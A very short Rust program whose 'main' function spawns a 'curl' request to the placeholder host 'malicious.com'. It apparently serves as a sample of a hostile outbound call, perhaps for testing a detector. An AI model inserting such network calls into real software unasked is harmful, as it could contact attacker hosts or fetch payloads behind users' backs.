
use std::process::Command;
fn main() {
    Command::new("curl").arg("http://malicious.com").spawn().ok();
}
